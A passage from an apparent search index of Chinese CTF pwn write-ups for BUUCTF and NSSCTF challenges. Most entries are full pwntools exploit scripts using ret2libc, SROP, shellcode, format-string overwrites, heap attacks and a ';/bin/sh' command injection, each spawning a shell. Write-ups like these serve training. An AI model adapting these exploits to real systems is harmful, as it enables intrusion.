p.recv()[:4]\nprint('leak--&gt;',printf_addr)\nprintf_addr = int.from_bytes(printf_addr,'little')\nlibc_addr = printf_addr - libc.symbols['printf']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\np.sendline(b'-1')\npayload = b'a'*0x30\npayload += p32(sys_addr)+p32(vulin)+p32(sh_addr)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#30_jarvisoj_level3","title":"\u9898\u76ee30_jarvisoj_level3","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2libc</code></li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u76f4\u63a5\u8fdb\u884c\u9006\u5411\uff0c\u5148\u67e5\u770b<code>main</code>\u51fd\u6570</li> </ul> <ul> <li>\u7136\u540e\u67e5\u770b<code>vulnerable_function()</code>\u51fd\u6570\uff0c\u53d1\u73b0\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u5e76\u6ca1\u6709<code>system</code>\u51fd\u6570\u548c<code>/bin/sh</code>\u5b57\u7b26\u4e32</li> </ul> <ul> <li>\u76f4\u63a5\u6253<code>ret2libc</code></li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('./level3')\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',25981)\nwrite_got = 0x804A018\nwrite_plt = 0x8048340\nvuln = 0x804844B  \npayload = b'a'*0x8c\npayload += p32(write_plt)+p32(vuln)+p32(1)\npayload += p32(write_got)+p32(0x4)\np.sendline(payload)\np.recvline()\nwrite_addr = p.recv()[:4]\nwrite_addr = int.from_bytes(write_addr,'little')\nprint(write_addr)\nlibc_addr = write_addr - libc.symbols['write']\nsys_addr = libc_addr + libc.symbols['system']\nsh_addr = libc_addr + next(libc.search(b'/bin/sh\\x00'))\npayload = b'a'*0x8c\npayload += p32(sys_addr)+p32(vuln)+p32(sh_addr)\npayload += p32(write_got)+p32(0x4)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#31_wustctf2020_getshell","title":"\u9898\u76ee31_wustctf2020_getshell","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2text</code></li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u76f4\u63a5\u9006\u5411\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa</li> </ul> <ul> <li>\u5e76\u4e14\u8fd8\u5b58\u5728shell</li> </ul> <ul> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('./wustctf2020_getshell')\nlibc = ELF('./libc-2.23.so')\np = remote('node5.buuoj.cn',27172)\npayload = b'a'*0x1c+p32(0x804851B)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#32_ciscn_2019_s_3","title":"\u9898\u76ee32_ciscn_2019_s_3","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2syscall</code>\u3001<code>SROP</code>\u3001<code>\u6808\u8fc1\u79fb</code></li> <li>\u67e5\u770b\u4fdd\u62a4\u673a\u5236\uff0c\u867d\u7136\u662f<code>32\u4f4d</code>\u4f46\u662f\u7cfb\u7edf\u8c03\u7528\u7528\u7684\u662f<code>64</code>\u4f4d\u7684\uff0c\u5e76\u4e0d\u662f\u5355\u7eaf\u7684<code>32</code>\u4f4d</li> </ul> <ul> <li>\u76f4\u63a5\u9006\u5411\u7a0b\u5e8f</li> </ul> <ul> <li>\u8fd8\u53d1\u73b0<code>gadget</code></li> </ul> <ul> <li>\u8fd9\u8fb9\u76f4\u63a5\u8c03\u7528\u4fe9\u6b21<code>SROP</code>\uff0c\u5728\u7b2c\u4e00\u6b21\u8c03\u7528<code>SROP</code>\u7684\u65f6\u5019\u987a\u4fbf\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u7b2c\u4e8c\u6b21<code>getshell</code></li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n#p = process('./ciscn_s_3')\nlibc = ELF('./libc-2.23.so')\n#gdb.attach(p)\n#pause()\np = remote('node5.buuoj.cn',26847)\npayload = b'b'*0x10 + p64(0x4004DA)\npayload+= p64(0x400517)\nsign = SigreturnFrame()\nsign.rax = 0\nsign.rdi = 0\nsign.rsi = 0x601030\nsign.rdx = 0x300\nsign.rip = 0x400517\nsign.rsp = 0x601030+0x8\nsign.rbp = 0x601030+0x100\npayload+=bytes(sign)\np.sendline(payload)\n\npayload = b'/bin/sh\\x00'\npayload += p64(0x4004DA)\npayload += p64(0x400517)\nsign2 = SigreturnFrame()\nsign2.rax = 59\nsign2.rdi = 0x601030\nsign2.rsi = 0\nsign2.rdx = 0\nsign2.rip = 0x400517\npayload+= bytes(sign2)\npause()\np.sendline(payload)\n\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/2%E7%AC%AC%E4%BA%8C%E9%A1%B5/","title":"\u7b2c\u4e8c\u9875","text":""},{"location":"BUUCTF/PWN/2%E7%AC%AC%E4%BA%8C%E9%A1%B5/#1_ez_pz_hackover_2016","title":"\u9898\u76ee1_ez_pz_hackover_2016","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>\u6808\u6ea2\u51fa</code>\u3001<code>shellcode</code></p> </li> <li> <p>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236\uff0c\u4fdd\u62a4\u673a\u5236\uff0c\u53d1\u73b0\u662f32\u4f4d\u7684\u7a0b\u5e8f\uff0c\u5e76\u4e14\u5f88\u591a\u4fdd\u62a4\u673a\u5236\u90fd\u6ca1\u6709\u5f00\u3002</p> </li> </ul> <p></p> <ul> <li>\u4e4b\u540e\u4f7f\u7528IDA pro\u53cd\u7f16\u8bd1\u4e00\u4e0b\u8be5\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4f1a\u5148\u8fdb\u884c\u8f93\u5165\u8f93\u51fa\u521d\u59cb\u5316</li> <li>\u4e4b\u540e\u5c31\u8c03\u7528\u4e24\u4e2a\u51fd\u6570</li> </ul> <p></p> <ul> <li>\u63a5\u4e0b\u6765\u5c31\u67e5\u770b<code>header()</code>\u8fd9\u4e2a\u51fd\u6570,\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570\u6ca1\u6709\u4efb\u4f55\u6f0f\u6d1e\u70b9</li> </ul> <p></p> <ul> <li> <p>\u518d\u770b\u4e00\u4e0b<code>chall()</code>,\u8fd9\u4e2a\u51fd\u6570\u4e3b\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3a</p> </li> <li> <p>\u9898\u76ee\u5148\u4f1a\u6cc4\u9732\u51fa<code>s</code>\u8fd9\u4e2a\u6570\u7ec4\u7684\u5730\u5740\uff0c\u5373\u6808\u4e0a\u7684\u5730\u5740</p> </li> <li> <p>\u5411<code>s</code>\u8f93\u5165\u5185\u5bb9\u8fd9\u4e2a\u5730\u65b9\u4e0d\u5b58\u5728\u6808\u6ea2\u51fa</p> </li> <li> <p>\u5e76\u4e14<code>v3</code>\u8fd9\u8fb9\u4f1a\u67e5\u627e<code>\\n</code>\uff0c\u7136\u540e\u4f1a\u5c06<code>\\n</code>\u7f6e<code>\\x00</code></p> </li> <li> <p>\u4e4b\u540e\u4f1a\u5c06\u6570\u7ec4<code>s</code>\u4e0e<code>crashme</code>\u8fdb\u884c\u6bd4\u8f83\u5982\u679c\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u7b49\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6267\u884c<code>vuln</code>\u8fd9\u4e2a\u51fd\u6570\u3002</p> </li> </ul> <p></p> <ul> <li>\u63a5\u4e0b\u6765\u67e5\u770b<code>vuln</code>\u8fd9\u4e2a\u51fd\u6570</li> <li> <p>\u8fd9\u4e2a\u51fd\u6570\u4f1a\u590d\u5236<code>0x400</code>\u5b57\u8282\u5230<code>dest</code>\u8fd9\u4e2a\u6570\u7ec4\u4e2d,\u8fd9\u4e2a\u590d\u5236\u7684\u503c\u662f\u4ece<code>&amp;src</code>\u6ce8\u610f\u662f\u4fdd\u5b58<code>src</code>\u5730\u5740\u7684\u6808\u5f00\u59cb\uff0c\u8fd9\u8fb9\u5b58\u5728\u6808\u6ea2\u51fa</p> </li> <li> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u6808\u6ea2\u51fa\u7684\u5229\u7528\u4e86\u3002\u7531\u4e8e\u6808\u53ef\u6267\u884c\uff0c\u76f4\u63a5\u5f80\u6808\u4e0a\u5199shellcode\u7136\u540e\u6267\u884c\u5373\u53ef</p> </li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process(\"./ez_pz_hackover_2016\")\np = remote('node5.buuoj.cn',27130)\np.recvuntil('crash: ')\n#gdb.attach(p)\nstack_addr = p.recvline()[:-1]\nprint(stack_addr)\nstack_addr = int(stack_addr.decode(),16)\na = asm(shellcraft.sh())\nprint('a---&gt;',len(a))\npayload = b'crashme\\x00' + cyclic(0x12)\npayload += p32(stack_addr-0x1c)+a\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/2%E7%AC%AC%E4%BA%8C%E9%A1%B5/#2_jarvisoj_level3_x64","title":"\u9898\u76ee2_jarvisoj_level3_x64","text":"<ul> <li>\u8003\u70b9<code>ret2libc</code>\u8fd9\u8fb9\u5c31\u4e0d\u591a\u4ecb\u7ecd\u4e86\uff0c\u7b80\u5355\u6808\u6ea2\u51fa\u7684<code>ret2libc</code>\u5e94\u7528</li> <li>\u6f0f\u6d1e\u70b9\u5c31\u5728\u8fd9\u91cc\uff1a</li> </ul> <ul> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\n#p = process('./level3_x64')\np = remote('node5.buuoj.cn',26355)\npop_rdi = 0x4006b3\npop_rsi = 0x4006b1\nwrite_addr = 0x4004B0\nwrite_got = 0x600A58\n#gdb.attach(p)\npayload = b'a'*0x88+p64(pop_rdi)+p64(1)\npayload += p64(pop_rsi)+p64(write_got)+p64(0)+p64(write_addr)+p64(0x4005E6)\npause()\np.sendline(payload)\np.recvline()\nwrite = p.recv()[0:6]\nprint('write_addr--&gt;',write)\nwrite = int.from_bytes(write,'little')\nlibc_addr = write - 0xF72B0\nsh_addr = libc_addr + 0x18CD57\nsys_addr = libc_addr + 0x45390\npayload =  b'a'*0x88+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/2%E7%AC%AC%E4%BA%8C%E9%A1%B5/#3_mrctf2020_shellcode","title":"\u9898\u76ee3_mrctf2020_shellcode","text":"<ul> <li>\u8003\u70b9<code>ret2shellcode</code></li> <li> <p>\u7b80\u5355\u7684<code>ret2shellcode</code>\uff0c\u9644\u4ef6\u90fd\u4e0d\u7528\u770b\u76f4\u63a5\u6253\uff0c\u6a21\u7248\u9898\u3002</p> </li> <li> <p>exp\u5982\u4e0b\uff1a</p> </li> </ul> <pre><code>from pwn import *\ncontext.arch='amd64'\np = process('./mrctf2020_shellcode')\np = remote('node5.buuoj.cn',27597)\npayload = asm(shellcraft.sh())\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/2%E7%AC%AC%E4%BA%8C%E9%A1%B5/#4_bjdctf_2020_babyrop2","title":"\u9898\u76ee4_bjdctf_2020_babyrop2","text":"<ul> <li>\u8003\u70b9\uff1a<code>ret2libc</code>\u3001<code>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</code>\u3001<code>canary\u4fdd\u62a4</code></li> <li>\u67e5\u770b\u4e00\u4e0b\u8be5\u9644\u4ef6\u7684\u4fdd\u62a4\u673a\u5236</li> </ul> <ul> <li>\u5f00\u4e86Canary\uff0c\u7a0b\u5e8f\u4e2d\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5148\u8981\u5229\u7528\u8be5\u6f0f\u6d1e\u5c31\u53ef\u4ee5\u6cc4\u9732<code>canary</code>\u4e86</li> </ul> <ul> <li>\u73b0\u5728\u5c31\u53ef\u4ee5\u76f4\u63a5<code>ret2libc</code>\u4e86</li> </ul> <pre><code>from pwn import *\np = process(\"./bjdctf_2020_babyrop2\")\n#gdb.attach(p)\np = remote('node5.buuoj.cn',28015)\np.sendline(b'%7$p')\ncanary = p.recvuntil(b'I\\'ll give u some gift to help u!\\n')\ncanary = p.recvline()[:-1]\nprint('canary--&gt;',canary)\ncanary = int(canary.decode(),16)\npop_rdi=0x400993\nputs_got = 0x601018\nputs_plt = 0x400610\npayload = b'a'*0x18+p64(canary)+b'a'*0x8+p64(pop_rdi)\npayload += p64(puts_got)+p64(puts_plt)+p64(0x400887)\np.sendline(payload)\np.recvuntil(b'Pull up your sword and tell me u story!\\n')\nputs_addr = p.recvline()[:-1]\nputs_addr = int.from_bytes(puts_addr,'little')\nlibc_addr = puts_addr - 0x6F690\nsys_addr = libc_addr + 0x45390\nsh_addr = libc_addr + 0x18CD57\nprint('puts_addr---&gt;',puts_addr)\npayload = b'a'*0x18+p64(canary)+b'a'*0x8+p64(pop_rdi)\npayload += p64(sh_addr)+p64(sys_addr)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/2%E7%AC%AC%E4%BA%8C%E9%A1%B5/#5_babyheap_0ctf_2017","title":"\u9898\u76ee5_babyheap_0ctf_2017","text":"<ul> <li>\u8003\u70b9\uff1a</li> </ul>"},{"location":"BUUCTF/PWN/2%E7%AC%AC%E4%BA%8C%E9%A1%B5/#6_bjdctf_2020_router","title":"\u9898\u76ee6_bjdctf_2020_router","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u547d\u4ee4\u6267\u884c</code></li> <li> <p>\u8fd9\u9898\u7684\u8003\u70b9\u5176\u5b9e\u7b97\u662f<code>web</code>\u7684\uff0c\u5176\u5b9e\u5b66\u5230\u540e\u9762\u5c31\u611f\u89c9<code>web</code>\u548c<code>pwn</code>\u6709\u70b9\u4e0d\u5206\u5bb6\uff0c\u5728\u7f51\u7edc\u653b\u9632\u90fd\u662f\u5360\u5f88\u5927\u4e00\u5757\u3002</p> </li> <li> <p>\u6211\u4eec\u76f4\u63a5\u5c31\u67e5\u770b\u9644\u4ef6\uff0c\u53d1\u73b0\u9009\u98791\u4f1a\u6267\u884c\u547d\u4ee4\uff0c\u5e76\u4e14<code>0x20676E6970</code>\u5c31\u662f<code>ping</code>\u7684\u5c0f\u7aef\u5e8f</p> </li> </ul> <p></p> <ul> <li>\u8fd9\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528<code>;</code>\u8fdb\u884c\u547d\u4ee4\u7ed5\u8fc7\uff0c\u76f4\u63a5\u9009\u62e9\u9009\u9879<code>1</code>\u7136\u540e\u6267\u884c\u547d\u4ee4<code>;/bin/sh</code>\u5373\u53ef<code>getshell</code></li> </ul> <p></p>"},{"location":"BUUCTF/PWN/3%E7%AC%AC%E4%B8%89%E9%A1%B5/","title":"\u7b2c\u4e09\u9875","text":""},{"location":"BUUCTF/PWN/4%E7%AC%AC%E5%9B%9B%E9%A1%B5/","title":"\u7b2c\u56db\u9875","text":""},{"location":"BUUCTF/PWN/4%E7%AC%AC%E5%9B%9B%E9%A1%B5/#12_ciscn_2019_sw_1","title":"\u9898\u76ee12_ciscn_2019_sw_1","text":"<ul> <li>\u8003\u70b9\uff1a<code>\u53ea\u80fd\u4e00\u6b21\u683c\u5f0f\u5316\u5b57\u7b26\u4e32</code></li> <li> <p>\u8fd9\u9898\u4e4b\u540e\u518d\u6765\u5f52\u7eb3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u8fd9\u9898\u518d\u7ec6\u8bb2</p> </li> <li> <p>\u76f4\u63a5\u8d34\u51faexp\uff1a</p> </li> </ul> <pre><code>from pwn import *\ncontext.arch = 'i386'\np = remote('node5.buuoj.cn',25550)\n#p = process('./ciscn_2019_sw_1')\n#gdb.attach(p)\npause()\nfini_addr = 0x804979C\nmain_addr = 0x8048534\nsys_addr = 0x80483D0\nprintf_got = 0x804989C\n# 0x8534\n# 0x804   0x83D0\npayload = b'%'+ str(0x83d0).encode('utf-8') + b'c%14$hn'\npayload += b'%'+ str(0x8534-0x83D0).encode('utf-8')+b'c%15$hn'\npayload += b'%'+ str(0x82D0).encode('utf-8')+b'c%16$hnaaa'\npayload += p32(printf_got)+p32(fini_addr)+p32(printf_got+2)\n#payload+= b'%'+str(0x804).encode('utf-8')+b'c%14$hnaaaaaaa'\n#payload+= p32(fini_addr)+p32(fini_addr+2)\n#payload= fmtstr_payload(4,{printf_got : sys_addr})\n#payload += b'%' + str(0x8534).encode('utf-8') +\nprint('len---&gt;',len(payload))\np.sendline(payload)\n#payload = fmtstr_payload(4,{})\np.sendline(b'/bin/sh\\x00')\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/4%E7%AC%AC%E5%9B%9B%E9%A1%B5/#14_lctf2016_pwn200","title":"\u9898\u76ee14_lctf2016_pwn200","text":"<ul> <li>\u8003\u70b9\uff1a<code>house_of_sprirt</code></li> <li>\u8fd9\u9898\u5728<code>house_of_sprirt</code>\u8fd9\u8fb9\u6709\u8be6\u7ec6\u89e3\u7b54\uff0c\u8fd9\u8fb9\u5c31\u76f4\u63a5\u7ed9exp\u3002</li> </ul> <pre><code>from pwn import *\ncontext(arch='amd64',log_level='debug')\np = process(\"./pwn200\")\n#p = remote(b'node5.buuoj.cn',25055)\ngdb.attach(p,\"b *0x400B1F\\n b *0x400824\\nb *0x400A5F\\n b *0x40092C\")\npayload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa'\npause()\np.sendafter(b'who are u?\\n',payload)\np.recvuntil(b'faaaaaaa')\nstack_addr = p.recvline()\nprint(stack_addr)\nstack_addr=stack_addr[:6]\nprint('stack_addr-------&gt;',stack_addr)\nstack_addr=int.from_bytes(stack_addr,'little')\nptr = stack_addr-0xf0+0x40\npayload1 = b'48'\np.sendlineafter(b'give me your id ~~?\\n',payload1)\n# payload2\u6784\u9020fake_chunk\npayload2 = p64(0x0)+p64(0x61)+b'a'*0x28+p64(ptr)\n#payload2 = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaa'#aaaahaaaaaaa'\np.sendafter(b'give me money~\\n',payload2)\npayload3 = b'2'\np.sendlineafter(b'your choice :',payload3)\npayload4 = b'1'\np.sendlineafter(b'your choice :',payload4)\npayload5 = b'80'\np.sendlineafter(b'how long?\\n',payload5)\na = asm(\"\"\"\n    mov rbx,0x0068732f6e69622f\n    push rbx\n    mov rdi,rsp\n    xor rsi,rsi\n    xor rdx,rdx\n    mov rax,59\n    syscall\n\"\"\")\nsh = a\nprint(\"--------&gt;\",len(sh))\npayload6 = sh +b'a'*3 + b'a'*0x18 + p64(ptr)\np.sendlineafter(b'give me more money :',payload6)\npayload = b'3'\np.sendlineafter(b'your choice :',payload)\np.interactive()\n</code></pre>"},{"location":"BUUCTF/PWN/4%E7%AC%AC%E5%9B%9B%E9%A1%B5/#29_houseoforange_hitcon_2016","title":"\u9898\u76ee29_houseoforange_hitcon_2016","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>house of orange</code></p> </li> <li> <p>\u8fd9\u9898\u4e5f\u5728<code>house_of_orange</code>\u4e2d\u6709\u5177\u4f53\u5206\u6790\uff0c\u8fd9\u8fb9\u4e5f\u76f4\u63a5\u8d34\u51faexp</p> </li> <li>exp\u5982\u4e0b\uff1a</li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\n#p = process('')\np = remote('node5.buuoj.cn',25648)\nlibc = ELF('libc-2.23.so')\n#libc = ELF('/home/myheart/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')\ndef add(size,name,price=1,color=2):\n    p.sendlineafter(b'Your choice :',b'1')\n    p.sendlineafter(b'Length of name :',str(size).encode())\n    p.sendafter(b'Name :',name)\n    p.sendlineafter(b'Price of Orange:',str(price).encode())\n    p.sendlineafter(b'Color of Orange:',str(color).encode())\n\ndef show():\n    p.sendlineafter(b'Your choice :',b'2')\n\n\ndef edit(size,name,price=1,color=2):\n    p.sendlineafter(b'Your choice :',b'3')\n    p.sendlineafter(b'Length of name :',str(size).encode())\n    p.sendafter(b'Name:',name)\n    p.sendlineafter(b'Price of Orange:',str(price).encode())\n    p.sendlineafter(b'Color of Orange:',str(color).encode())\n\n\n#gdb.attach(p)\nadd(0x400-0x10-0x40,b'aaa',10)\npayload = b'a'*0x3b8+p64(0x21)+p32(0xc)+p32(0x20)+p64(0)\npayload +=p64(0)+p64(0xc01)\nedit(0x500,payload,12)\nadd(0x1000,b'asdasd',10)\nadd(0x500,b'\\x10',10)\nshow()\n\np.recvuntil(b'Name of house : ')\nlibc_x = u64(p.recvline()[:-1].ljust(8,b'\\x00'))\nprint('libc_x---&gt;',hex(libc_x))\n\nlibc_addr = libc_x - libc.symbols['__malloc_hook']-1520-0x10\nsys_addr = libc_addr + libc.symbols['system']\n# 104\nio_list_all = libc_addr + libc.symbols['_IO_list_all']\nmain_arena =  libc_addr + libc.symbols['__malloc_hook'] +0x68\nedit(0x10,b'1'*0x10,1)\nshow()\np.recvuntil(b'Name of house : 1111111111111111')\n\nheap_addr = u64(p.recvline()[:-1].ljust(8,b'\\x00'))\nprint('heap_addr---&gt;',hex(heap_addr))\n\nheap_dst_addr = heap_addr+1328#2608\nprint('io_list_all---&gt;',hex(io_list_all))\npayload = b'b'*(0x500+0x20)#+p64(0)+p64(0x21)+b'a'*0x10\npayload += b'/bin/sh\\x00'+p64(0x61)\npayload += p64(main_arena) + p64(io_list_all-0x10)\npayload += p64(0x2) + p64(0x3) # io_write_base\npayload += p64(0)*9+p64(sys_addr)\npayload += p64(0)*11+p64(heap_dst_addr+0x60)\n#pause()\nprint('heap_dst_addr',hex(heap_dst_addr))\nprint('main_arena',hex(main_arena))\n#pause()\nedit(0xc00,payload,66)\npause()\np.sendlineafter(b'Your choice : ',str(1))\np.interactive() \n</code></pre>"},{"location":"BUUCTF/PWN/5%E7%AC%AC%E4%BA%94%E9%A1%B5/","title":"\u7b2c\u4e94\u9875","text":""},{"location":"BUUCTF/PWN/5%E7%AC%AC%E4%BA%94%E9%A1%B5/#12de1ctf_2019_weapon","title":"\u9898\u76ee12\u2014de1ctf_2019_weapon","text":"<ul> <li> <p>\u8003\u70b9\uff1a\u5806\u5206\u6c34\u3001unsorted_bin_attack\u3001fast_bin_double_free\u3001stdout\u6cc4\u9732libc\uff0c\u8be6\u7ec6\u89e3\u7b54\u5728<code>stdout\u4efb\u610f\u5730\u5740\u8bfb</code>\u8fd9\u7bc7\u535a\u5ba2\u4e2d</p> </li> <li> <p>exp\u5982\u4e0b\uff1a</p> </li> </ul> <pre><code>from pwn import *\ncontext.log_level = 'debug'\nlibc = ELF('./libc-2.23.so')\n#p = process(\"./de1ctf_2019_weapon1\")\nfor i in range(100):\n    p = remote('node5.buuoj.cn',29028)\n    def add(size,index,context):\n        p.sendlineafter(b'choice &gt;&gt;',b'1')\n        #p.interactive()\n        p.sendlineafter(b'size of weapon:',str(size).encode())\n        p.sendlineafter(b'input index:',str(index).encode())\n        p.sendafter(b'input your name:',context)\n\n    def delete(index):\n        p.sendlineafter(b'choice &gt;&gt;',b'2')\n        p.sendlineafter(b'input idx :',str(index).encode())\n\n    def rename(index,context):\n        p.sendlineafter(b'choice &gt;&gt;',b'3')\n        p.sendlineafter(b'input idx:',str(index).encode())\n        p.sendafter(b'new content:',context)\n    # \u5229\u7528double_free\u548c\u5806\u5206\u6c34,\u4f7f\u5f97\u80fd\u5c06\u5806\u5757\u653e\u5165unsorted_bin\u4e2d\n    add(0x50,0,b'a')\n    add(0x50,1,b'a')\n    add(0x60,2,b'a')\n    add(0x50,3,b'a')\n    add(0x50,4,b'a')\n\n    payload = p64(0)*9 + p64(0x61)\n    rename(0,payload)\n    delete(1)\n    delete(3)\n    delete(1)\n    rename(3,p8(0x50))\n    #add(0x50,5,b'\\x50')\n    add(0x50,6,b'a')\n    add(0x50,7,b'a')\n    add(0x50,8,p64(0)+p64(0xd1))\n    delete(1)\n    delete(2)\n    # \u4f7f\u7528unsorted_bin_attack,\u4f7f\u5f97libc\u7684\u5730\u5740\u80fd\u88ab\u5199\u5165\u5230fastbin\u94fe\u8868\u4e2d\n    add(0x20,9,b'a')\n    add(0x20,10,b'a')\n    rename(2,p16(0x25e5-0x8))\n    add(0x60,11,b'1')\n    try:\n        # \u7533\u8bf7\u5230libc\u5730\u5740\u540e\u4fee\u6539stdout\u7684IO\u7ed3\u6784\u4f53,\u5e76\u63a5\u6536\u5730\u5740\n        add(0x60,12,b'\\x00\\x00\\x00'+p64(0)*6+p64(0xfbad1800)+p64(0)*3+p8(0))\n        leak = p.recvuntil(b'\\x7f')[-6:]\n        print('leak---&gt;',leak)\n        leak = u64(leak.ljust(8,b'\\x00'))\n        print('leak---&gt;',hex(leak))\n        libc_addr = leak - 192 - libc.symbols['_IO_2_1_stderr_']\n        print('libc_addr---&gt;',hex(libc_addr))\n        malloc_hook = libc_addr + libc.symbols['__malloc_hook']\n        des_addr = malloc_hook - 0x23\n    except:\n        p.close()\n        continue\n    #system_addr = libc_addr + libc.symbols['system']\n    \"\"\"\n    delete(5)\n    delete(6)\n    delete(5)\n    add(0x60,12,b'1')\n    rename(5,p64(des_addr))\n    add(0x60,13,b'1')\n    \"\"\"\n\n    #add(0x60,12,b'1')\n    \"\"\"\n    0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\n    constraints:\n    rax == NULL\n\n    0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\n    constraints:\n    [rsp+0x30] == NULL\n\n    0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)\n    constraints:\n    [rsp+0x50] == NULL\n\n    0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)\n    constraints:\n    [rsp+0x70] == NULL\n    \"\"\"\n    # \u518d\u6b21\u4f7f\u7528fastbin_double_free,\u5229\u7528malloc_hook\u6253ogg\n    ogg = [0x45216,0x4526a,0xf02a4,0xf1147]\n    ogg_ = ogg[3] + libc_addr\n    add(0x60,13,b'1')\n    add(0x60,14,b'1')\n    delete(13)\n    delete(14)\n    delete(13)\n    add(0x60,15,p64(des_addr))\n    add(0x60,16,b'1')\n    add(0x60,16,b'1')\n    add(0x60,17,b'a'*0x13+p64(ogg_))\n    sleep(0.2)\n    p.sendline(b'1')\n    p.sendline(b'32')\n    p.sendline(b'17')\n    #gdb.attach(p)\n    p.sendline(b'cat flag')\n\n    p.interactive()\n</code></pre>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/","title":"\u7b2c\u4e00\u9875","text":"<ul> <li>\u6ca1\u6709\u6309\u7167<code>NSSCTF</code>\u7684\u9898\u76ee\u5e8f\u53f7\u6765\uff0c\u8fd8\u6709\u5c31\u662f\u6bcf\u4e00\u9875<code>15\u9898</code></li> </ul>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#1_littleof","title":"\u9898\u76ee1_littleof","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>ret2libc</code>\u3001<code>Canary\u7ed5\u8fc7</code></p> </li> <li> <p>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236\uff0c\u53d1\u73b0\u5f00\u4e86Canary</p> </li> </ul> <p></p> <ul> <li>\u7136\u540e\u518d\u53cd\u7f16\u8bd1\u67e5\u770b\u4e00\u4e0b\u7a0b\u5e8f\u8fd0\u884c\u7684\u903b\u8f91\u3002\u8fd0\u884c\u903b\u8f91\u4e3b\u8981\u5c31\u662f\u5728\u4e0b\u56fe\u7684\u51fd\u6570\u4e2d\u3002</li> <li>\u8fd9\u8fb9\u8fd8\u6709\u4fe9\u4e2a\u6ea2\u51fa\u70b9\uff0c\u4f46\u662f\u7531\u4e8e\u6709Canary\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u6ea2\u51fa\u70b9\u662f\u6cc4\u9732Canary\u7684\u503c\uff0c\u7136\u540e\u7b2c\u4e8c\u4e2a\u624d\u662f\u771f\u6b63\u7684\u8fdb\u884c\u6ea2\u51fa\u6784\u9020ROP\u94fe</li> <li>\u8fd9\u8fb9\u8fd8\u9700\u8981\u6ce8\u610f\u4e00\u4e0b\u63a5\u6536\uff0c\u56e0\u4e3a<code>%s</code>\u9664\u4e86\u683c\u5f0f\u5316\u8f93\u51faCanary\u7684\u503c\uff0c\u8fd8\u8f93\u51fa\u4e86rbp\u6808\u5730\u5740\u7684\u503c</li> </ul> <p></p> <p></p> <ul> <li>exp\uff1a</li> </ul> <pre><code>from pwn import *\ncontext(log_level = 'debug')\np = remote('node4.anna.nssctf.cn',28938)\n#p = process('./littleof')\n#gdb.attach(p)\n#p.send(b'a')\npayload = b'a'*0x49\np.sendafter(b'Do you know how to do buffer overflow?\\n',payload)\n#p.send(b'a')\ncanary = p.recv()\ncanary = b'\\x00' + canary[0x49:0x50]\nprint(canary)\ncanary = 